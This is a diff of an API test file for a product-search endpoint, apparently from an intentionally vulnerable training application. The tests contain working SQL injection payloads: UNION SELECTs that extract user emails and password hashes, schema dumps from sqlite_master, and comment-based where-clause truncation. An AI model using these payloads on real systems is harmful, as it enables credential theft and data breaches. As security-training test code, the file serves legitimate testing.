@@ -28,7 +28,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search fails with error message that exposes ins SQL Injection vulnerability', () => {
-    return frisby.get(REST_URL + '/products/search?q=\';')
+    return frisby.get(`${REST_URL}/products/search?q=';`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -36,7 +36,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search SQL Injection fails from two missing closing parenthesis', () => {
-    return frisby.get(REST_URL + '/products/search?q=\' union select null,id,email,password,null,null,null from users--')
+    return frisby.get(`${REST_URL}/products/search?q=' union select id,email,password from users--`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -44,7 +44,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search SQL Injection fails from one missing closing parenthesis', () => {
-    return frisby.get(REST_URL + '/products/search?q=\') union select null,id,email,password,null,null,null from users--')
+    return frisby.get(`${REST_URL}/products/search?q=') union select id,email,password from users--`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -52,7 +52,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search SQL Injection fails for SELECT * FROM attack due to wrong number of returned columns', () => {
-    return frisby.get(REST_URL + '/products/search?q=\')) union select * from users--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select * from users--`)
       .expect('status', 500)
       .expect('header', 'content-type', /text\/html/)
       .expect('bodyContains', '<h1>' + config.get('application.name') + ' (Express')
@@ -60,7 +60,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can create UNION SELECT with Users table and fixed columns', () => {
-    return frisby.get(REST_URL + '/products/search?q=\')) union select \'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\' from users--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select '1','2','3','4','5','6','7','8','9' from users--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
@@ -76,7 +76,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can create UNION SELECT with Users table and required columns', () => {
-    return frisby.get(REST_URL + '/products/search?q=\')) union select null,id,email,password,null,null,null,null,null from users--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select id,email,password,'4','5','6','7','8','9' from users--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
@@ -112,7 +112,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can create UNION SELECT with sqlite_master table and required column', () => {
-    return frisby.get(REST_URL + '/products/search?q=\')) union select null,sql,null,null,null,null,null,null,null from sqlite_master--')
+    return frisby.get(`${REST_URL}/products/search?q=')) union select sql,'2','3','4','5','6','7','8','9' from sqlite_master--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .expect('json', 'data.?', {
@@ -133,7 +133,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search by description cannot select logically deleted christmas special due to forced early where-clause termination', () => {
-    return frisby.get(REST_URL + '/products/search?q=seasonal%20special%20offer\'))--')
+    return frisby.get(`${REST_URL}/products/search?q=seasonal%20special%20offer'))--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -142,7 +142,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can select logically deleted christmas special by forcibly commenting out the remainder of where clause', () => {
-    return frisby.get(REST_URL + '/products/search?q=' + christmasProduct.name + '\'))--')
+    return frisby.get(`${REST_URL}/products/search?q=${christmasProduct.name}'))--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
@@ -152,7 +152,7 @@ describe('/rest/products/search', () => {
   })
 
   it('GET product search can select logically deleted unsafe product by forcibly commenting out the remainder of where clause', () => {
-    return frisby.get(REST_URL + '/products/search?q=' + pastebinLeakProduct.name + '\'))--')
+    return frisby.get(`${REST_URL}/products/search?q=${pastebinLeakProduct.name}'))--`)
       .expect('status', 200)
       .expect('header', 'content-type', /application\/json/)
       .then(({ json }) => {
